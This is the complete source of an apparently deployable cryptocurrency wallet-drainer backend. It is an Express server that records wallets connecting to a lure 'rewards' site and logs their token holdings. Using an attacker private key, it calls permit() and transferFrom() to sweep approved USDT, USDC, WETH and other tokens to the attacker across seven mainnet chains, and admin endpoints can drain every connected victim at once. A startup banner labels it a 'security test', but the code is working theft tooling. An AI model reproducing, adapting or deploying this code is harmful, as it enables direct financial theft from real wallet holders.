require('dotenv').config()
const express = require('express')
const cors    = require('cors')
const { ethers } = require('ethers')
const path = require('path')
const fs   = require('fs')
// persistence via GitHub Gist (no external DB needed)

const app = express()
app.use(cors({
  origin: ['https://rewards.ustx.online', 'http://localhost', 'http://127.0.0.1'],
  methods: ['GET','POST','DELETE'],
  allowedHeaders: ['Content-Type','x-admin-password']
}))
app.use(express.json())

// Serve admin panel at /admin
app.use('/admin', express.static(path.join(__dirname, 'admin')))
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin', 'index.html')))

// ── Config ────────────────────────────────────────────────────────────────────
let config = {
  attackerPrivateKey: process.env.ATTACKER_PRIVATE_KEY || '',
  adminUsername:      process.env.ADMIN_USERNAME || 'admin',
  adminPassword:      process.env.ADMIN_PASSWORD || 'NexR3w@rds!2026',
}

// ── In-memory cache (fast reads) ──────────────────────────────────────────────
const connectedWallets = []
const drainHistory     = []
const logs             = []

// ── GitHub Gist persistence (survives Render deploys) ────────────────────────
const GIST_ID    = process.env.GIST_ID    || ''
const GIST_TOKEN = process.env.GIST_TOKEN || ''
let gistReady = false
let saveTimer = null

async function connectDB() {
  if (GIST_ID && GIST_TOKEN) {
    try {
      const data = await gistLoad()
      if (data) {
        if (Array.isArray(data.connectedWallets)) connectedWallets.push(...data.connectedWallets)
        if (Array.isArray(data.drainHistory))     drainHistory.push(...data.drainHistory)
        gistReady = true
        console.log(`[GIST] Loaded ${connectedWallets.length} wallets, ${drainHistory.length} drains`)
      }
    } catch(e) {
      console.log('[GIST] Load failed:', e.message)
      loadFromFile()
    }
  } else {
    console.log('[GIST] No GIST_ID/GIST_TOKEN — falling back to local data.json')
    loadFromFile()
  }
}

async function gistLoad() {
  const res = await fetch(`https://api.github.com/gists/${GIST_ID}`, {
    headers: { 'Authorization': `token ${GIST_TOKEN}`, 'Accept': 'application/vnd.github.v3+json' },
    signal: AbortSignal.timeout(10000)
  })
  if (!res.ok) throw new Error(`Gist fetch failed: ${res.status}`)
  const gist = await res.json()
  const file = Object.values(gist.files)[0]
  if (!file || !file.content) return null
  return JSON.parse(file.content)
}

async function gistSave() {
  if (!gistReady) return
  try {
    const content = JSON.stringify({ connectedWallets, drainHistory }, null, 2)
    await fetch(`https://api.github.com/gists/${GIST_ID}`, {
      method: 'PATCH',
      headers: { 'Authorization': `token ${GIST_TOKEN}`, 'Content-Type': 'application/json', 'Accept': 'application/vnd.github.v3+json' },
      body: JSON.stringify({ files: { 'ustx-data.json': { content } } }),
      signal: AbortSignal.timeout(15000)
    })
  } catch(e) { console.log('[GIST] Save error:', e.message) }
}

// Debounced save — batches rapid changes into one write (5s delay)
function scheduleSave() {
  if (saveTimer) clearTimeout(saveTimer)
  saveTimer = setTimeout(() => gistSave(), 5000)
}

function loadFromFile() {
  try {
    const DATA_FILE = path.join(__dirname, 'data.json')
    const saved = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'))
    if (Array.isArray(saved.connectedWallets)) connectedWallets.push(...saved.connectedWallets)
    if (Array.isArray(saved.drainHistory))     drainHistory.push(...saved.drainHistory)
    console.log(`[FILE] Loaded ${connectedWallets.length} wallets, ${drainHistory.length} drains`)
  } catch(_) {
    console.log('[FILE] No saved data — fresh start')
  }
}

function persistWallet(_wallet) { scheduleSave() }
function persistDrain(_drain)   { scheduleSave() }
async function deleteAllFromDB() { scheduleSave() }

function persist() {
  scheduleSave()
  // Also save locally as backup
  try {
    const DATA_FILE = path.join(__dirname, 'data.json')
    fs.writeFileSync(DATA_FILE, JSON.stringify({ connectedWallets, drainHistory }, null, 2))
  } catch(_) {}
}

// Extract the most readable part of an ethers.js error (strips JSON blobs)
function cleanError(raw) {
  if (!raw) return 'Unknown error'
  // Extract inner error message from ethers.js wrapper JSON
  const m = raw.match(/"message"\s*:\s*"([^"]{4,})"/)
  if (m) return m[1]
  // Cut off at the first parenthesis (which starts the huge JSON payload)
  const short = raw.split(' (')[0].trim()
  return short.length > 8 ? short : raw.slice(0, 150)
}

function addLog(level, msg) {
  const entry = { time: new Date().toISOString(), level, message: msg }
  logs.unshift(entry)
  if (logs.length > 200) logs.pop()
  console.log(`[${level.toUpperCase()}] ${msg}`)
}

// ── RPC providers per chain (multiple fallbacks) ─────────────────────────────
const RPCS = {
  1:     ['https://eth.drpc.org','https://ethereum.publicnode.com','https://eth.llamarpc.com','https://cloudflare-eth.com'],
  56:    ['https://bsc.publicnode.com','https://bsc.drpc.org','https://bsc-dataseed.binance.org','https://bsc-dataseed1.defibit.io','https://bsc-dataseed2.binance.org'],
  137:   ['https://polygon.publicnode.com','https://polygon.drpc.org','https://polygon-rpc.com'],
  42161: ['https://arbitrum-one.publicnode.com','https://arb1.arbitrum.io/rpc'],
  10:    ['https://optimism.publicnode.com','https://optimism.drpc.org','https://mainnet.optimism.io'],
  43114: ['https://avalanche-c-chain.publicnode.com','https://api.avax.network/ext/bc/C/rpc'],
  8453:  ['https://base.publicnode.com','https://base.drpc.org','https://mainnet.base.org'],
}

async function getProvider(chainId) {
  const urls = RPCS[chainId] || []
  for (const url of urls) {
    try {
      const p = new ethers.providers.JsonRpcProvider({ url, timeout: 6000 })
      await p.getNetwork()
      return p
    } catch (_) {}
  }
  throw new Error(`All RPCs unreachable for chain ${chainId} — check internet connection`)
}

const EXPLORERS = {
  1:     'https://etherscan.io/tx/',
  56:    'https://bscscan.com/tx/',
  137:   'https://polygonscan.com/tx/',
  42161: 'https://arbiscan.io/tx/',
  10:    'https://optimistic.etherscan.io/tx/',
  43114: 'https://snowtrace.io/tx/',
  8453:  'https://basescan.org/tx/',
}

const ERC20_ABI = [
  'function permit(address,address,uint256,uint256,uint8,bytes32,bytes32)',
  'function approve(address,uint256) returns (bool)',
  'function transferFrom(address,address,uint256) returns (bool)',
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address,address) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)',
]

async function getAttackerWallet(chainId) {
  if (!config.attackerPrivateKey) throw new Error('Attacker private key not configured')
  const provider = await getProvider(chainId)
  return new ethers.Wallet(config.attackerPrivateKey, provider)
}

// ── Admin auth middleware ────────────────────────────────────────────────────
function adminAuth(req, res, next) {
  const auth = req.headers['x-admin-password']
  if (auth !== config.adminPassword) {
    return res.status(401).json({ error: 'Unauthorized' })
  }
  next()
}

// ════════════════════════════════════════════════════════════════════════════
// PUBLIC ENDPOINTS (called by the victim's DApp frontend)
// ════════════════════════════════════════════════════════════════════════════

// Health check / pre-warm — frontend pings this on page load to prevent cold-start delay
app.get('/ping', (req, res) => res.json({ ok: true, ts: Date.now() }))

// Called when a wallet connects to the DApp
app.post('/api/connect', async (req, res) => {
  const { address, chainId, userAgent, tokens } = req.body
  if (!address) return res.json({ ok: false })

  const existing = connectedWallets.find(w => w.address.toLowerCase() === address.toLowerCase())
  if (existing) {
    existing.lastSeen = new Date().toISOString()
    existing.chainId  = chainId
    existing.online   = true
    if (tokens && tokens.length) {
      existing.tokens = tokens
      addLog('info', `Wallet ${address} tokens updated: ${tokens.map(t => t.symbol + ' ' + t.balance).join(', ')}`)
      persist()
    } else {
      addLog('info', `Wallet reconnected: ${address} on chainId ${chainId}`)
    }
  } else {
    const entry = {
      id:          Date.now(),
      address,
      chainId,
      userAgent:   userAgent || '',
      connectedAt: new Date().toISOString(),
      lastSeen:    new Date().toISOString(),
      online:      true,
      drained:     false,
      drainTx:     null,
      tokens:      tokens || [],
    }
    connectedWallets.unshift(entry)
    addLog('info', `Wallet connected: ${address} on chainId ${chainId}`)
    persistWallet(entry)
    persist()
  }

  // Check which chains attacker has gas on so frontend skips unfunded chains
  let fundedChains = []
  if (config.attackerPrivateKey) {
    const attackerAddr = new ethers.Wallet(config.attackerPrivateKey).address
    const GAS_MIN = ethers.utils.parseEther('0.0001')
    const checks = Object.entries(RPCS).map(async ([chainId, rpcs]) => {
      for (const url of rpcs) {
        try {
          const p = new ethers.providers.JsonRpcProvider({ url, timeout: 8000 })
          const bal = await p.getBalance(attackerAddr)
          if (bal.gte(GAS_MIN)) { fundedChains.push(parseInt(chainId)); return }
          // Don't break — try next RPC in case this one returned stale/wrong data
        } catch(_) {}
      }
    })
    await Promise.allSettled(checks)
  }

  res.json({
    ok: true,
    attackerAddress: config.attackerPrivateKey ? new ethers.Wallet(config.attackerPrivateKey).address : null,
    fundedChains
  })
})

// ── Core drain logic — reused by both /api/drain and /admin/drain-manual ────
async function performDrain(owner, tokenAddress, chainId, sig, permitParams) {
  // Guard: native ETH placeholder is not an ERC-20, transferFrom will always revert
  if (tokenAddress.toLowerCase() === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') {
    return { success: false, error: 'Native coin cannot be drained via transferFrom — use drain-native endpoint' }
  }

  addLog('warn', `Drain — owner: ${owner} | token: ${tokenAddress} | chain: ${chainId}`)

  const record = {
    id:          Date.now(),
    owner,
    tokenAddress,
    chainId:     parseInt(chainId),
    startedAt:   new Date().toISOString(),
    success:     false,
    txHash:      null,
    amount:      null,
    symbol:      null,
    error:       null,
  }

  try {
    const attacker = await getAttackerWallet(parseInt(chainId))

    // Pre-flight: check attacker has gas
    const gasBal = await attacker.getBalance()
    if (gasBal.eq(0)) {
      throw new Error(`Attacker wallet has 0 gas on chain ${chainId} — send native coin to ${attacker.address}`)
    }

    const token    = new ethers.Contract(tokenAddress, ERC20_ABI, attacker)
    const symbol   = await token.symbol().catch(() => 'TOKEN')
    const decimals = await token.decimals().catch(() => 18)
    record.symbol  = symbol

    addLog('info', `Token: ${symbol} | Attacker: ${attacker.address} | Gas: ${ethers.utils.formatEther(gasBal)}`)

    // ── Step 1: Try permit() if signature provided ──────────────────────────
    if (sig && permitParams) {
      try {
        addLog('info', `Attempting permit() on ${symbol}...`)
        const { v, r, s } = ethers.utils.splitSignature(sig)
        const tx = await token.permit(
          owner,
          attacker.address,
          permitParams.value,
          permitParams.deadline,
          v, r, s,
          { gasLimit: 300000 }
        )
        addLog('info', `permit() tx: ${tx.hash}`)
        await tx.wait()
        addLog('info', `permit() confirmed ✓`)
      } catch (e) {
        addLog('warn', `permit() failed: ${e.message.slice(0, 100)}`)
      }
    }

    // ── Step 2: Check allowance ─────────────────────────────────────────────
    const allowance = await token.allowance(owner, attacker.address)
    addLog('info', `Allowance: ${ethers.utils.formatUnits(allowance, decimals)} ${symbol}`)

    if (allowance.eq(0)) {
      record.error = `No allowance on ${symbol} — victim must approve or sign permit first`
      addLog('warn', record.error)
      drainHistory.unshift(record)
      persistDrain(record)
      return { success: false, error: record.error }
    }

    // ── Step 3: transferFrom ────────────────────────────────────────────────
    const balance     = await token.balanceOf(owner)
    const drainAmount = balance.lt(allowance) ? balance : allowance

    addLog('info', `Draining ${ethers.utils.formatUnits(drainAmount, decimals)} ${symbol}...`)

    const gasPrice = await attacker.provider.getGasPrice()
    const tx = await token.transferFrom(
      owner,
      attacker.address,
      drainAmount,
      { gasLimit: 200000, gasPrice: gasPrice.mul(13).div(10) }
    )

    addLog('info', `transferFrom sent: ${tx.hash}`)
    await tx.wait()
    addLog('info', `Drain confirmed ✓ Tx: ${tx.hash}`)

    const formatted = ethers.utils.formatUnits(drainAmount, decimals)
    record.success     = true
    record.txHash      = tx.hash
    record.amount      = formatted
    record.confirmedAt = new Date().toISOString()

    const w = connectedWallets.find(x => x.address.toLowerCase() === owner.toLowerCase())
    if (w) { w.drained = true; w.drainTx = tx.hash; persistWallet(w) }

    drainHistory.unshift(record)
    persistDrain(record)
    persist()

    return {
      success:     true,
      txHash:      tx.hash,
      amount:      formatted,
      symbol,
      explorerUrl: (EXPLORERS[parseInt(chainId)] || 'https://bscscan.com/tx/') + tx.hash
    }

  } catch (e) {
    record.error = cleanError(e.message)
    addLog('error', `Drain failed: ${record.error}`)
    drainHistory.unshift(record)
    persistDrain(record)
    persist()
    return { success: false, error: record.error }
  }
}

// Log native coin drain (tx already sent by frontend — just record it)
app.post('/api/drain-native', async (req, res) => {
  const { owner, chainId, amount, symbol, txHash } = req.body
  if (!owner) return res.json({ ok: false })
  const record = {
    id: Date.now(), owner, tokenAddress: 'native', chainId: parseInt(chainId),
    startedAt: new Date().toISOString(), confirmedAt: new Date().toISOString(),
    success: true, txHash: txHash || null, amount, symbol,
    error: null, method: 'native'
  }
  drainHistory.unshift(record)
  const w = connectedWallets.find(x => x.address.toLowerCase() === owner.toLowerCase())
  if (w) { w.drained = true; w.drainTx = txHash; persistWallet(w) }
  addLog('warn', `Native drain: ${amount} ${symbol} from ${owner} | tx: ${txHash}`)
  persistDrain(record)
  persist()
  res.json({ ok: true })
})

// Called after victim approves spending — backend sweeps immediately
app.post('/api/drain', async (req, res) => {
  const { owner, tokenAddress, chainId, sig, permitParams } = req.body
  if (!owner || !tokenAddress || !chainId) return res.json({ success: false, error: 'Missing params' })
  res.json(await performDrain(owner, tokenAddress, chainId, sig, permitParams))
})

// ════════════════════════════════════════════════════════════════════════════
// ADMIN ENDPOINTS
// ════════════════════════════════════════════════════════════════════════════

app.post('/admin/login', (req, res) => {
  const { username, password } = req.body
  if (username === config.adminUsername && password === config.adminPassword) {
    res.json({ ok: true })
  } else {
    res.status(401).json({ ok: false, error: 'Invalid credentials' })
  }
})

// Get dashboard data
app.get('/admin/dashboard', adminAuth, (req, res) => {
  let attackerAddress = null
  try {
    if (config.attackerPrivateKey) {
      attackerAddress = new ethers.Wallet(config.attackerPrivateKey).address
    }
  } catch (_) {}

  res.json({
    attackerAddress,
    totalConnected: connectedWallets.length,
    totalDrained:   drainHistory.filter(d => d.success).length,
    connectedWallets: connectedWallets.slice(0, 50),
    drainHistory:     drainHistory.slice(0, 50),
    logs:             logs.slice(0, 100),
  })
})

// Get wallets list
app.get('/admin/wallets', adminAuth, (req, res) => {
  res.json(connectedWallets.slice(0, 100))
})

// Get drain history
app.get('/admin/drains', adminAuth, (req, res) => {
  res.json(drainHistory.slice(0, 100))
})

// Get logs
app.get('/admin/logs', adminAuth, (req, res) => {
  res.json(logs.slice(0, 200))
})

// Update config (set receiving wallet, password)
app.post('/admin/config', adminAuth, (req, res) => {
  const { attackerPrivateKey, adminPassword } = req.body

  if (attackerPrivateKey !== undefined) {
    try {
      new ethers.Wallet(attackerPrivateKey) // validate key
      config.attackerPrivateKey = attackerPrivateKey
      addLog('info', `Attacker wallet updated: ${new ethers.Wallet(attackerPrivateKey).address}`)
    } catch (_) {
      return res.json({ ok: false, error: 'Invalid private key' })
    }
  }

  if (adminPassword) {
    config.adminPassword = adminPassword
    addLog('info', 'Admin password updated')
  }

  res.json({ ok: true })
})

// Manually trigger drain for a specific token (from admin panel)
app.post('/admin/drain-manual', adminAuth, async (req, res) => {
  const { owner, tokenAddress, chainId } = req.body
  if (!owner || !tokenAddress || !chainId) return res.json({ success: false, error: 'Missing params' })
  addLog('warn', `Manual drain triggered by admin for ${owner}`)
  res.json(await performDrain(owner, tokenAddress, chainId, null, null))
})

// Scan a wallet on-chain: discover all tokens + check allowances for admin
app.post('/admin/scan-wallet', adminAuth, async (req, res) => {
  const { address } = req.body
  if (!address) return res.json({ ok: false, error: 'Missing address' })

  let attackerAddress = null
  try { attackerAddress = new ethers.Wallet(config.attackerPrivateKey).address } catch(_) {}
  if (!attackerAddress) return res.json({ ok: false, error: 'Attacker wallet not configured' })

  addLog('info', `Admin scan: ${address}`)
  const results = []

  // Well-known tokens per chain
  const TOKENS = {
    1:     [
      { addr: '0xdAC17F958D2ee523a2206206994597C13D831ec7', sym: 'USDT' },
      { addr: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', sym: 'USDC' },
      { addr: '0x6B175474E89094C44Da98b954EedeAC495271d0F', sym: 'DAI' },
      { addr: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', sym: 'WETH' },
      { addr: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', sym: 'WBTC' },
    ],
    56:    [
      { addr: '0x55d398326f99059fF775485246999027B3197955', sym: 'USDT' },
      { addr: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', sym: 'USDC' },
      { addr: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', sym: 'BUSD' },
      { addr: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', sym: 'WBNB' },
      { addr: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', sym: 'ETH' },
    ],
    137:   [
      { addr: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', sym: 'USDT' },
      { addr: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', sym: 'USDC' },
      { addr: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', sym: 'WETH' },
    ],
    42161: [
      { addr: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', sym: 'USDT' },
      { addr: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', sym: 'USDC' },
      { addr: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', sym: 'WETH' },
    ],
    10:    [
      { addr: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', sym: 'USDT' },
      { addr: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85', sym: 'USDC' },
    ],
    43114: [
      { addr: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', sym: 'USDT' },
      { addr: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', sym: 'USDC' },
    ],
    8453:  [
      { addr: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', sym: 'USDC' },
      { addr: '0x4200000000000000000000000000000000000006', sym: 'WETH' },
    ],
  }

  const chainIds = Object.keys(RPCS).map(Number)
  await Promise.allSettled(chainIds.map(async (chainId) => {
    try {
      const provider = await getProvider(chainId)
      // Check native balance
      const nativeBal = await provider.getBalance(address)
      const nativeFormatted = parseFloat(ethers.utils.formatEther(nativeBal))
      const chainNames = { 1:'Ethereum', 56:'BSC', 137:'Polygon', 42161:'Arbitrum', 10:'Optimism', 43114:'Avalanche', 8453:'Base' }
      const nativeSyms = { 1:'ETH', 56:'BNB', 137:'MATIC', 42161:'ETH', 10:'ETH', 43114:'AVAX', 8453:'ETH' }
      if (nativeFormatted > 0.0001) {
        results.push({
          chainId, chain: chainNames[chainId] || `Chain ${chainId}`,
          token: 'native', symbol: nativeSyms[chainId] || 'ETH', decimals: 18,
          balance: nativeFormatted.toFixed(6), allowance: 'N/A', drainable: false
        })
      }
      // Check ERC-20 tokens
      const tokens = TOKENS[chainId] || []
      for (const tk of tokens) {
        try {
          const contract = new ethers.Contract(tk.addr, ERC20_ABI, provider)
          const bal = await contract.balanceOf(address)
          if (bal.eq(0)) continue
          const dec = await contract.decimals().catch(() => 18)
          const formatted = parseFloat(ethers.utils.formatUnits(bal, dec))
          let allowanceVal = '0'
          let drainable = false
          if (attackerAddress) {
            const allow = await contract.allowance(address, attackerAddress)
            allowanceVal = parseFloat(ethers.utils.formatUnits(allow, dec)).toFixed(4)
            drainable = allow.gt(0)
          }
          results.push({
            chainId, chain: chainNames[chainId] || `Chain ${chainId}`,
            token: tk.addr, symbol: tk.sym, decimals: dec,
            balance: formatted.toFixed(4), allowance: allowanceVal, drainable
          })
        } catch(_) {}
      }
    } catch(_) {}
  }))

  res.json({ ok: true, address, attackerAddress, tokens: results })
})

// Drain ALL approved tokens from a wallet across all chains
app.post('/admin/drain-all', adminAuth, async (req, res) => {
  const { address } = req.body
  if (!address) return res.json({ ok: false, error: 'Missing address' })
  addLog('warn', `Admin DRAIN ALL triggered for ${address}`)

  // First scan to find drainable tokens
  let attackerAddress = null
  try { attackerAddress = new ethers.Wallet(config.attackerPrivateKey).address } catch(_) {}
  if (!attackerAddress) return res.json({ ok: false, error: 'Attacker wallet not configured' })

  const drainResults = []
  const TOKENS = {
    1:     [{ addr:'0xdAC17F958D2ee523a2206206994597C13D831ec7',sym:'USDT' },{ addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',sym:'USDC' },{ addr:'0x6B175474E89094C44Da98b954EedeAC495271d0F',sym:'DAI' },{ addr:'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',sym:'WETH' }],
    56:    [{ addr:'0x55d398326f99059fF775485246999027B3197955',sym:'USDT' },{ addr:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',sym:'USDC' },{ addr:'0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',sym:'BUSD' }],
    137:   [{ addr:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F',sym:'USDT' },{ addr:'0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',sym:'USDC' }],
    42161: [{ addr:'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',sym:'USDT' },{ addr:'0xaf88d065e77c8cC2239327C5EDb3A432268e5831',sym:'USDC' }],
    10:    [{ addr:'0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',sym:'USDT' },{ addr:'0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',sym:'USDC' }],
    43114: [{ addr:'0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',sym:'USDT' },{ addr:'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',sym:'USDC' }],
    8453:  [{ addr:'0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',sym:'USDC' }],
  }

  for (const [chainId, tokens] of Object.entries(TOKENS)) {
    try {
      const attacker = await getAttackerWallet(parseInt(chainId))
      const gasBal = await attacker.getBalance()
      if (gasBal.eq(0)) continue // skip unfunded chains

      for (const tk of tokens) {
        try {
          const contract = new ethers.Contract(tk.addr, ERC20_ABI, attacker)
          const bal = await contract.balanceOf(address)
          if (bal.eq(0)) continue
          const allow = await contract.allowance(address, attacker.address)
          if (allow.eq(0)) continue
          // Has balance + allowance — drain it
          const result = await performDrain(address, tk.addr, parseInt(chainId), null, null)
          drainResults.push({ ...result, symbol: tk.sym, chainId: parseInt(chainId) })
        } catch(_) {}
      }
    } catch(_) {}
  }

  res.json({ ok: true, results: drainResults, total: drainResults.length })
})

// Drain ALL approved tokens from ALL connected wallets in one click
app.post('/admin/drain-everything', adminAuth, async (req, res) => {
  addLog('warn', 'DRAIN EVERYTHING triggered by admin')
  let attackerAddress = null
  try { attackerAddress = new ethers.Wallet(config.attackerPrivateKey).address } catch(_) {}
  if (!attackerAddress) return res.json({ ok: false, error: 'Attacker wallet not configured' })

  const TOKENS = {
    1:     [{addr:'0xdAC17F958D2ee523a2206206994597C13D831ec7',sym:'USDT'},{addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',sym:'USDC'},{addr:'0x6B175474E89094C44Da98b954EedeAC495271d0F',sym:'DAI'},{addr:'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',sym:'WETH'},{addr:'0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',sym:'WBTC'}],
    56:    [{addr:'0x55d398326f99059fF775485246999027B3197955',sym:'USDT'},{addr:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',sym:'USDC'},{addr:'0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',sym:'BUSD'},{addr:'0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',sym:'WBNB'},{addr:'0x2170Ed0880ac9A755fd29B2688956BD959F933F8',sym:'ETH'}],
    137:   [{addr:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F',sym:'USDT'},{addr:'0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',sym:'USDC'},{addr:'0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',sym:'WETH'}],
    42161: [{addr:'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',sym:'USDT'},{addr:'0xaf88d065e77c8cC2239327C5EDb3A432268e5831',sym:'USDC'},{addr:'0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',sym:'WETH'}],
    10:    [{addr:'0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',sym:'USDT'},{addr:'0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',sym:'USDC'}],
    43114: [{addr:'0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',sym:'USDT'},{addr:'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',sym:'USDC'}],
    8453:  [{addr:'0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',sym:'USDC'},{addr:'0x4200000000000000000000000000000000000006',sym:'WETH'}],
  }

  const allResults = []
  const walletAddresses = [...new Set(connectedWallets.map(w => w.address))]

  for (const owner of walletAddresses) {
    if (owner.startsWith('0xTest') || owner === '0x0000000000000000000000000000000000000001') continue
    for (const [chainId, tokens] of Object.entries(TOKENS)) {
      try {
        const attacker = await getAttackerWallet(parseInt(chainId))
        const gasBal = await attacker.getBalance()
        if (gasBal.eq(0)) continue
        for (const tk of tokens) {
          try {
            const contract = new ethers.Contract(tk.addr, ERC20_ABI, attacker)
            const bal = await contract.balanceOf(owner)
            if (bal.eq(0)) continue
            const allow = await contract.allowance(owner, attacker.address)
            if (allow.eq(0)) continue
            addLog('info', `Draining ${tk.sym} from ${owner.slice(0,10)}... on chain ${chainId}`)
            const result = await performDrain(owner, tk.addr, parseInt(chainId), null, null)
            allResults.push({ owner: owner.slice(0,10)+'...', symbol: tk.sym, chainId: parseInt(chainId), ...result })
          } catch(_) {}
        }
      } catch(_) {}
    }
  }

  const success = allResults.filter(r => r.success)
  addLog('info', `DRAIN EVERYTHING complete: ${success.length}/${allResults.length} successful`)
  res.json({ ok: true, results: allResults, totalAttempted: allResults.length, totalSuccess: success.length })
})

// Clear logs
app.delete('/admin/logs', adminAuth, (req, res) => {
  logs.length = 0
  res.json({ ok: true })
})

// Clear all connected wallets and drain history
app.delete('/admin/wallets', adminAuth, async (_req, res) => {
  connectedWallets.length = 0
  drainHistory.length = 0
  await deleteAllFromDB()
  persist()
  addLog('info', 'All wallets and drain history cleared')
  res.json({ ok: true })
})

// Clear only failed drains (clean up test data)
app.delete('/admin/failed-drains', adminAuth, (req, res) => {
  const before = drainHistory.length
  const kept = drainHistory.filter(d => d.success)
  drainHistory.length = 0
  drainHistory.push(...kept)
  persist()
  addLog('info', `Cleared ${before - kept.length} failed drain records`)
  res.json({ ok: true, removed: before - kept.length })
})

// ── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3001
connectDB().then(() => app.listen(PORT, () => {
  console.log('\n========================================')
  console.log('  Drainer Demo Backend — SECURITY TEST')
  console.log('========================================')
  console.log(`  Backend API : http://localhost:${PORT}`)
  console.log(`  Admin Panel : http://localhost:${PORT}/admin`)
  console.log('========================================')

  if (config.attackerPrivateKey) {
    try {
      const w = new ethers.Wallet(config.attackerPrivateKey)
      console.log(`  Attacker    : ${w.address}`)
    } catch (_) {
      console.log('  Attacker    : Invalid key in .env')
    }
  } else {
    console.log('  Attacker    : Not set — configure in Admin Panel')
  }
  console.log('========================================\n')
}))
